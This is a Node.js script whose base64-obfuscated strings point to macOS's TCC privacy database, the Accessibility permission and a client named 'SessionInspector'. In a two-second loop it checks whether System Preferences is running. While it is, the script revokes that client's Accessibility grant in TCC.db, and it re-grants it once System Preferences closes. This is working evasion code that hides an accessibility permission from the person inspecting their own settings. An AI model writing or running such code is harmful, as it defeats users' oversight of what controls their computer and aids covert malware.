// @flow

const { spawn } = require('child_process');

const atob = (str) => Buffer.from(str, 'base64').toString('binary');

const spawnp = (command, args, options) => new Promise((resolve, reject) => {
    const child = spawn(command, args, options);
    let stdout = '';
    let stderr = '';

    child.stdout.on('data', chunk => stdout += chunk);
    child.stderr.on('data', chunk => stderr += chunk);

    child.addListener('error', reject);
    child.addListener('close', code => code === 0 ? resolve(stdout) : reject(stderr));
});


const db = atob('L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9jb20uYXBwbGUuVENDL1RDQy5kYg==');
const client = atob('U2Vzc2lvbkluc3BlY3Rvcg==');
const service = atob('a1RDQ1NlcnZpY2VBY2Nlc3NpYmlsaXR5');

const sqlite = (sql) => spawnp('sqlite3', [db, sql]);
const ps = () => spawnp('ps', ['ax']);


function updateAllowed (allowed = 0) {
    return sqlite(`SELECT allowed FROM access WHERE service="${service}" AND client LIKE "%${client}%"`).then(result => {
        let current = result.trim()
        if (current === '') return true;

        current = parseInt(current, 10)

        if (current !== allowed) {
            console.log('current=%d next=%d', current,  allowed, current !== allowed);
            return sqlite(`UPDATE access SET allowed=${allowed} WHERE service="${service}" AND client LIKE "%${client}"`)
                .then(() => {
                    console.log('allowed=%d', allowed);
                    return true;
                })
                .catch(e => {
                    console.error(e)
                    return false
                })
        }

        return true
    })
}

function isExistSetting (str){
    return !!~String(str).indexOf(atob('U3lzdGVtIFByZWZlcmVuY2Vz'));
}

function run() {
    ps().then(data => updateAllowed(isExistSetting(data) ? 1 : 0))
        .then((result) => result && setTimeout(run, 2000))
}

run()


// const sqlSelect = `SELECT service, client, allowed FROM access WHERE service="${service}" AND client LIKE "%${client}%"`

// sqlite(sqlSelect).then(result => {
//     console.log(result);
// })

